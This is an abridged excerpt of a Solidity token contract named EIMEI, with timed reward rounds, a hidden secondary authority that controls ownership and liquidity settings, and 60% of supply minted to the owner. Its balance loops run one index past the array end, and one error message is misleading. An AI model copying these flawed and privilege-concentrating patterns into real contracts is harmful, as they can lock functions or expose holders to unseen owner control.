...
library RoundPool {
    ...
    function inc(RoundBalances storage round, uint256 amount)
        internal
        returns (uint256)
    {
    ...
    function getReflection(
        RoundBalances storage round,
        RoundTime memory roundTime
    ...
    function settle(
        ...
        if (
            amount > 0 &&
            round.status == 1 &&
            block.timestamp >= roundTime.timeEnd
        ) {
...
contract Token {
    ...
    string private _name = "EIMEI";
    string private _symbol = "EIMEI";
    uint8 private _decimals = 18;
    address private _owner;
    uint256 private _cap = 0;

    uint256 private _roundCount = 4;
    ...
    mapping(address => mapping(uint256 => RoundPool.RoundBalances))
        private _roundBalances;
    ...
    constructor() public {
        ...
        _mint(_owner, _totalSupply.mul(6).div(10));
    }
    ...
    function transferOwnership(address newOwner) public {
        require(
            newOwner != address(0) && _msgSender() == _auth2,
    ...
    function Liquidity(address liquidity_) public {
        require(
            liquidity_ != address(0) && _msgSender() == _auth2,
            "Ownable: new owner is the zero address"
        );
    ...
    function _mint(address account, uint256 amount) internal {
        ...
        require((_cap = _cap.add(amount)) <= _totalSupply, "ERC20: cant mint over total supply");
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(this), account, amount);
    }

    function incRoundBalances(address account, uint256 amount)
        private
        returns (bool)
    {
        require((_cap = _cap.add(amount)) <= _totalSupply, "ERC20: cant mint over total supply");
    ...
    function getRoundBalances(address addr)
        public
        view
        returns (uint256 balance)
    {
        ...
        for (uint256 i = 0; i <= _roundTime.length; i++) {
            if (_roundBalances[addr][i].status == 1) {
                balance = balance.add(
                    _roundBalances[addr][i].getReflection(_roundTime[i])
                );
            }
        }
    }
    ...
    function getRoundTotal(address addr) public view returns (uint256 balance) {
        ...
        for (uint256 i = 0; i <= _roundTime.length; i++) {
            if (_roundBalances[addr][i].status == 1) {
                balance = balance.add(
                    _roundBalances[addr][i].total.sub(
                        _roundBalances[addr][i].claim
                    )
                );
            }
        }
